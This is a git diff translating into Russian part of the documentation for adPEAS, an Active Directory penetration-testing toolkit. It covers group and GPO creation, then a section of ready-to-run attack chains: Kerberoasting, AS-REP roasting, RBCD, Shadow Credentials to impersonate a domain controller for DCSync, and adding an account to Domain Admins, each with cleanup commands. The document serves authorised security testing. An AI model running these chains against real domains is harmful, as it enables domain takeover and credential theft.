@@ -1223,9 +1223,9 @@ Password (SAVE THIS!)                        X9@kL2#mP5!nQ8$wR3
 
 ## New-DomainGroup
 
-Creates a new group object in Active Directory via DirectoryEntry.
+Создаёт новую группу Active Directory через DirectoryEntry.
 
-### Syntax
+### Синтаксис
 
 ```powershell
 New-DomainGroup
@@ -1240,51 +1240,51 @@ New-DomainGroup
     [-Credential <PSCredential>]
 ```
 
-### Parameters
+### Параметры
 
-| Parameter | Type | Description |
+| Параметр | Тип | Описание |
 |-----------|------|-------------|
-| `-Name` | String | sAMAccountName for the new group. |
-| `-OrganizationalUnit` | String | DistinguishedName of the OU where the group should be created. Default: CN=Users,DC=domain,DC=com |
-| `-Description` | String | Description attribute for the group. |
-| `-GroupScope` | String | Group scope: `Global`, `Universal`, or `DomainLocal`. Default: Global |
-| `-GroupType` | String | Group type: `Security` or `Distribution`. Default: Security |
-| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
-| `-Domain` | String | Target domain (FQDN) |
-| `-Server` | String | Specific Domain Controller to target |
-| `-Credential` | PSCredential | PSCredential object for authentication |
+| `-Name` | String | sAMAccountName новой группы |
+| `-OrganizationalUnit` | String | DistinguishedName OU создания; по умолчанию CN=Users,DC=domain,DC=com |
+| `-Description` | String | Атрибут описания группы |
+| `-GroupScope` | String | Область действия группы: `Global`, `Universal` или `DomainLocal`; по умолчанию Global |
+| `-GroupType` | String | Тип группы: `Security` либо `Distribution`; по умолчанию Security |
+| `-PassThru` | Switch | Вернуть объект результата вместо вывода в консоль (для сценариев) |
+| `-Domain` | String | Целевой домен (FQDN) |
+| `-Server` | String | Целевой контроллер домена |
+| `-Credential` | PSCredential | Объект PSCredential для аутентификации |
 
-### Group Scopes
+### Области действия групп
 
-| Scope | Members From | Can Be Used In |
+| Область | Откуда могут быть участники | Где можно использовать |
 |-------|--------------|----------------|
-| **Global** | Same domain only | Any domain in forest |
-| **Universal** | Any domain in forest | Any domain in forest |
-| **DomainLocal** | Any domain | Same domain only |
+| **Global** | Только из того же домена | Любой домен в лесу |
+| **Universal** | Любой домен в лесу | Любой домен в лесу |
+| **DomainLocal** | Любой домен | Только тот же домен |
 
-### Examples
+### Примеры
 
 ```powershell
-# Create global security group (default)
+# Создать глобальную группу безопасности (по умолчанию)
 New-DomainGroup -Name "IT-Admins"
 
-# Create universal security group
+# Создать универсальную группу безопасности
 New-DomainGroup -Name "Enterprise-Admins-Custom" -GroupScope Universal
 
-# Create domain-local group
+# Создать локальную группу домена
 New-DomainGroup -Name "Server-LocalAdmins" -GroupScope DomainLocal
 
-# Create distribution group (for email)
+# Создать группу рассылки (для почты)
 New-DomainGroup -Name "EmailList" -GroupType Distribution -GroupScope Universal
 
-# Create group in specific OU with description
+# Создать группу в определённой OU с описанием
 New-DomainGroup -Name "DBAs" -OrganizationalUnit "OU=Groups,DC=contoso,DC=com" -Description "Database Administrators"
 
-# Create and capture result
+# Создать и сохранить результат
 $result = New-DomainGroup -Name "TestGroup" -PassThru
 ```
 
-### Output (Console)
+### Пример консольного вывода
 
 ```
 [+] Successfully created group: IT-Admins
@@ -1293,7 +1293,7 @@ Type                                         Security
 Scope                                        Global
 ```
 
-### Output (-PassThru)
+### Результат (-PassThru)
 
 ```powershell
 [PSCustomObject]@{
@@ -1311,9 +1311,9 @@ Scope                                        Global
 
 ## New-DomainGPO
 
-Creates a new Group Policy Object in Active Directory with proper SYSVOL folder structure.
+Создаёт объект групповой политики в AD с корректной структурой каталога SYSVOL.
 
-### Syntax
+### Синтаксис
 
 ```powershell
 New-DomainGPO
@@ -1325,53 +1325,53 @@ New-DomainGPO
     [-Credential <PSCredential>]
 ```
 
-### Parameters
+### Параметры
 
-| Parameter | Type | Description |
+| Параметр | Тип | Описание |
 |-----------|------|-------------|
-| `-DisplayName` | String | Display name for the new GPO (user-friendly name shown in GPMC). |
-| `-NoSYSVOL` | Switch | Skip SYSVOL folder creation. Only the AD object will be created. The GPO will appear "broken" in GPMC until SYSVOL is populated manually. |
-| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
-| `-Domain` | String | Target domain (FQDN) |
-| `-Server` | String | Specific Domain Controller to target |
-| `-Credential` | PSCredential | PSCredential object for authentication |
+| `-DisplayName` | String | Отображаемое имя новой GPO (удобное имя, показываемое в GPMC) |
+| `-NoSYSVOL` | Switch | Не создавать каталог SYSVOL — создаётся только объект AD. В GPMC политика выглядит «повреждённой» до ручного заполнения SYSVOL |
+| `-PassThru` | Switch | Вернуть объект результата вместо вывода в консоль (для сценариев) |
+| `-Domain` | String | Целевой домен (FQDN) |
+| `-Server` | String | Целевой контроллер домена |
+| `-Credential` | PSCredential | Объект PSCredential для аутентификации |
 
-### GPO Structure
+### Структура GPO
 
-When a GPO is created, it consists of two parts:
+При создании GPO формируются две части:
 
-1. **AD Object**: `CN={GUID},CN=Policies,CN=System,DC=domain,DC=com`
-   - Stores displayName, flags, versionNumber, gPCFileSysPath
-   - Contains permissions (who can edit/apply)
+1. **Объект AD**: `CN={GUID},CN=Policies,CN=System,DC=domain,DC=com`
+   - Хранит displayName, flags, versionNumber, gPCFileSysPath.
+   - Содержит разрешения (кто может редактировать или применять).
 
-2. **SYSVOL Folder**: `\\domain.com\SYSVOL\domain.com\Policies\{GUID}\`
-   - `Machine\` - Machine configuration files
-   - `User\` - User configuration files
-   - `GPT.INI` - Version information
+2. **Каталог SYSVOL**: `\\domain.com\SYSVOL\domain.com\Policies\{GUID}\`
+   - `Machine\` — конфигурация компьютеров.
+   - `User\` — конфигурация пользователей.
+   - `GPT.INI` — сведения о версии.
 
-### Permission Mirroring
+### Согласование разрешений
 
-New-DomainGPO automatically mirrors AD object permissions to SYSVOL to prevent the GPMC "permissions inconsistent" warning:
+New-DomainGPO автоматически переносит разрешения объекта AD на SYSVOL, чтобы GPMC не показывала предупреждение о несовпадении разрешений:
 
-| AD Object ACE | SYSVOL ACE |
+| ACE объекта AD | ACE SYSVOL |
 |---------------|------------|
-| GenericAll (0xF01FF/0xF00FF) | Full Control |
-| GenericRead (0x20094) | Read & Execute |
-| ExtendedRight (0x100) | Read & Execute |
+| GenericAll (0xF01FF/0xF00FF) | Полный доступ |
+| GenericRead (0x20094) | Чтение и выполнение |
+| ExtendedRight (0x100) | Чтение и выполнение |
 
-### Examples
+### Примеры
 
 ```powershell
-# Create complete GPO (AD object + SYSVOL)
+# Создать полную GPO (объект AD и SYSVOL)
 New-DomainGPO -DisplayName "Test Policy"
 
-# Create GPO in remote domain
+# Создать GPO в удалённом домене
 New-DomainGPO -DisplayName "Security Policy" -Domain "contoso.com" -Credential (Get-Credential)
 
-# Create only AD object (no SYSVOL)
+# Создать только объект AD (без SYSVOL)
 New-DomainGPO -DisplayName "AD Only GPO" -NoSYSVOL
 
-# Create GPO and capture result for scripting
+# Создать GPO и сохранить результат для сценария
 $result = New-DomainGPO -DisplayName "Audit Policy" -PassThru
 if ($result.Success) {
     Write-Host "GPO GUID: $($result.GUID)"
@@ -1379,7 +1379,7 @@ if ($result.Success) {
 }
 ```
 
-### Output (Console)
+### Пример консольного вывода
 
 ```
 [+] Successfully created GPO AD object: Test Policy
@@ -1392,7 +1392,7 @@ User folder                                  \\dc01.contoso.com\SYSVOL\contoso.c
 GPT.INI                                      \\dc01.contoso.com\SYSVOL\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}\GPT.INI
 ```
 
-### Output (-PassThru)
+### Результат (-PassThru)
 
 ```powershell
 [PSCustomObject]@{
@@ -1407,157 +1407,157 @@ GPT.INI                                      \\dc01.contoso.com\SYSVOL\contoso.c
 }
 ```
 
-### Notes
+### Примечания
 
-- GPO is created without any settings (empty policy)
-- Use `Set-DomainGPO` or GPMC to configure settings
-- Link GPO to OUs using `Set-DomainGPO -Link` or GPMC
-- If SYSVOL creation fails, the AD object is still created but GPO will appear broken in GPMC
+- GPO создаётся без заданных параметров (пустая политика).
+- Для настройки используйте `Set-DomainGPO` или GPMC.
+- Для привязки к OU используйте `Set-DomainGPO -Link` либо GPMC.
+- Если создание SYSVOL завершилось ошибкой, объект AD сохраняется, но GPMC показывает политику повреждённой.
 
 ---
 
-## Common Attack Patterns
+## Типовые сценарии атак
 
-### 1. Kerberoasting Chain
+### 1. Цепочка Kerberoasting
 
 ```powershell
-# Add SPN to high-value account
+# Добавить SPN к высокопривилегированной учётной записи
 Set-DomainUser -Identity "svc_backup" -SetSPN "HTTP/fake.contoso.com"
 
-# Kerberoast the account
+# Выполнить проверку Kerberoasting для этой записи
 Invoke-Kerberoast -Identity "svc_backup"
 
-# Cleanup
+# Очистка
 Set-DomainUser -Identity "svc_backup" -ClearSPN "HTTP/fake.contoso.com"
 ```
 
-### 2. ASREPRoasting Chain
+### 2. Цепочка ASREPRoasting
 
 ```powershell
-# Disable pre-authentication
+# Отключить предварительную аутентификацию
 Set-DomainUser -Identity "targetuser" -DontReqPreauth
 
-# Roast the account
+# Проверить AS-REP для записи
 Invoke-ASREPRoast -Identity "targetuser"
 
-# Cleanup
+# Очистка
 Set-DomainUser -Identity "targetuser" -ClearDontReqPreauth
 ```
 
-### 3. RBCD Attack Chain
+### 3. Цепочка атаки RBCD
 
 ```powershell
-# Create computer account
+# Создать учётную запись компьютера
 $pc = New-DomainComputer -Name "RBCD-ATTACK" -PassThru
 
-# Configure RBCD on target
+# Настроить RBCD на целевом объекте
 Set-DomainComputer -Identity "DC01" -AddRBCD "RBCD-ATTACK$"
 
-# Get TGT for attack computer
+# Получить TGT для проверочного компьютера
 $tgt = Invoke-KerberosAuth -UserName "RBCD-ATTACK$" -Domain "contoso.com" -Password $pc.Password
 
-# Cleanup
+# Очистка
 Set-DomainComputer -Identity "DC01" -ClearRBCD -Force
 ```
 
-### 4. Shadow Credentials Chain (PKINIT without CA)
+### 4. Цепочка Shadow Credentials (PKINIT без УЦ)
 
-Shadow Credentials allow PKINIT authentication **without requiring a Certificate Authority**. The certificate is self-signed and validated via the public key stored in `msDS-KeyCredentialLink`.
+Shadow Credentials позволяют аутентификацию PKINIT **без центра сертификации**. Самоподписанный сертификат проверяется по открытому ключу в `msDS-KeyCredentialLink`.
 
-**Prerequisite:** Domain Functional Level **2016 or higher**. The `msDS-KeyCredentialLink` attribute only exists from DFL 2016 onwards.
+**Предварительное условие:** функциональный уровень домена **2016 или выше**. Атрибут `msDS-KeyCredentialLink` доступен начиная с DFL 2016.
 
 ```powershell
-# Step 1: Add Shadow Credential (generates RSA key pair + self-signed certificate)
+# Шаг 1: добавить Shadow Credential (RSA-ключ и самоподписанный сертификат)
 $result = Set-DomainUser -Identity "admin" -AddShadowCredential -PassThru
 
-# Output includes:
-# - PFXPath: Path to generated certificate
-# - PFXPassword: Auto-generated password
-# - DeviceID: For targeted cleanup
+# В результате возвращаются:
+# - PFXPath: путь к созданному сертификату
+# - PFXPassword: автоматически сгенерированный пароль
+# - DeviceID: идентификатор для адресной очистки
 
-# Step 2: Use certificate for PKINIT authentication
+# Шаг 2: использовать сертификат для аутентификации PKINIT
 Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword
 
-# You are now authenticated as "admin"!
+# Теперь аутентификация выполнена от имени "admin"!
 
-# Step 3: Cleanup - remove specific Shadow Credential
+# Шаг 3: очистка — удалить определённую Shadow Credential
 Set-DomainUser -Identity "admin" -ClearShadowCredentials -DeviceID $result.DeviceID
 ```
 
-**How it works**:
-1. adPEAS generates an RSA-2048 key pair
-2. The public key is stored in `msDS-KeyCredentialLink` (KEYCREDENTIALLINK_BLOB format)
-3. A self-signed X.509 certificate is created with Smart Card Logon + Client Auth EKUs
-4. The KDC validates PKINIT by checking the public key in AD (not via CA trust)
+**Принцип работы:**
+1. adPEAS создаёт пару ключей RSA-2048.
+2. Открытый ключ сохраняется в `msDS-KeyCredentialLink` (формат KEYCREDENTIALLINK_BLOB).
+3. Создаётся самоподписанный сертификат X.509 с EKU Smart Card Logon и Client Auth.
+4. KDC проверяет PKINIT по открытому ключу в AD, а не по цепочке доверия УЦ.
 
-**Works on Computer accounts too** (e.g., for DCSync):
+**Работает и с учётными записями компьютеров** (например, для проверки DCSync):
 ```powershell
 $result = Set-DomainComputer -Identity "DC01" -AddShadowCredential -PassThru
 Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword
-# Now authenticated as DC01$ - DCSync possible!
+# Теперь аутентификация как DC01$ — возможен DCSync!
 ```
 
-See [Authentication-Methods](03-Authentication-Methods.md#certificate-pkinit) for more PKINIT details.
+Подробности о PKINIT см. в [методах аутентификации](03-Authentication-Methods.md#certificate-pkinit).
 
-### 5. Group Privilege Escalation
+### 5. Повышение привилегий через группы
 
 ```powershell
-# Add to Domain Admins (requires WriteMembers)
+# Добавить в Domain Admins (требуется WriteMembers)
 Set-DomainGroup -Identity "Domain Admins" -AddMember "attacker"
 
-# Cleanup
+# Очистка
 Set-DomainGroup -Identity "Domain Admins" -RemoveMember "attacker"
 ```
 
 ---
 
-## Cleanup Best Practices
+## Рекомендации по очистке
 
-> **Always clean up after testing!**
+> **Всегда устраняйте внесённые изменения после тестирования!**
 
-1. **Remove added SPNs**
+1. **Удалите добавленные SPN**
    ```powershell
    Set-DomainUser -Identity "target" -ClearSPN "HTTP/fake.contoso.com"
    ```
 
-2. **Re-enable pre-authentication**
+2. **Снова включите предварительную аутентификацию**
    ```powershell
    Set-DomainUser -Identity "target" -ClearDontReqPreauth
    ```
 
-3. **Remove RBCD configurations**
+3. **Удалите настройки RBCD**
    ```powershell
    Set-DomainComputer -Identity "DC01" -ClearRBCD -Force
    ```
 
-4. **Remove Shadow Credentials**
+4. **Удалите Shadow Credentials**
    ```powershell
    Set-DomainUser -Identity "target" -ClearShadowCredentials -Force
    ```
 
-5. **Remove from groups**
+5. **Удалите участников из групп**
    ```powershell
    Set-DomainGroup -Identity "Domain Admins" -RemoveMember "attacker"
    ```
 
-6. **Revoke ACL changes**
+6. **Отзовите изменения ACL**
    ```powershell
    Set-DomainObject -Identity "DC=contoso,DC=com" `
        -RevokeACE -Principal "CONTOSO\attacker" -ExtendedRight "DCSync"
    ```
 
-7. **Restore certificate templates** (if backed up)
+7. **Восстановите шаблоны сертификатов** (если была резервная копия)
    ```powershell
-   # Restore from backup...
+    # Восстановить из резервной копии...
    Set-CertificateTemplate -Identity "WebServer" `
        -DisableEnrolleeSuppliesSubject -AddManagerApproval
    ```
 
 ---
 
-## PassThru for Scripting
+## Использование PassThru в сценариях
 
-All Set-* functions support `-PassThru` for programmatic use:
+Все функции Set-* поддерживают `-PassThru` для программного использования:
 
 ```powershell
 $result = Set-DomainUser -Identity "target" -SetSPN "HTTP/test" -PassThru
@@ -1570,7 +1570,7 @@ if ($result.Success) {
 }
 ```
 
-### Return Object Structure
+### Структура возвращаемого объекта
 
 ```powershell
 [PSCustomObject]@{
@@ -1579,14 +1579,14 @@ if ($result.Success) {
     DistinguishedName = "CN=..."
     Success = $true/$false
     Message = "Operation result"
-    # Additional operation-specific properties
+    # Дополнительные свойства, зависящие от операции
 }
 ```
 
 ---
 
-## Navigation
+## Навигация
 
-- [Previous: Core-Functions](06-Core-Functions.md)
-- [Next: Helper-Functions](08-Helper-Functions.md)
-- [Back to Home](00-Home.md)
+- [Назад: основные функции](06-Core-Functions.md)
+- [Далее: вспомогательные функции](08-Helper-Functions.md)
+- [На главную](00-Home.md)
